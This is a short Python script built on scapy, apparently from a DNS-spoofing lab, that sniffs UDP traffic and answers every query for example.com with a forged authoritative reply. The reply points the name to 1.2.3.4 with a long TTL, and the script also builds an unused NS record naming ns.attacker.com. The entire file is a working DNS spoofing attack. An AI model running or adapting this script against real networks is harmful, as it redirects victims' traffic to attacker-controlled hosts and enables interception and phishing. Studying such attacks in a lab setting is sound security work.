from scapy.all import *

# flush DNS cache: ipconfig /flushdns

def hijack_domain(pkt):
    """Hijack the entire `example.com` domain"""
    if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        print("Spoofing DNS reply for DNS query for `example.com`")
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        udp = UDP(sport=53, dport=pkt[UDP].sport)

        ANssec = DNSRR(
            rrname=pkt[DNS].qd.qname, type='A',
            rdata='1.2.3.4', ttl=259200
        )
        NSsec = DNSRR(
            rrname="example.com", type="NS",
            ttl=259200, rdata='ns.attacker.com' 
        )
        dns = DNS(
            id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,
             qr=1, qdcount=1, ancount=1, an=ANssec
        )

        spoofpkt = ip/udp/dns
        send(spoofpkt, verbose=0)

if __name__ == "__main__":
    sniff(filter="udp", prn=hijack_domain)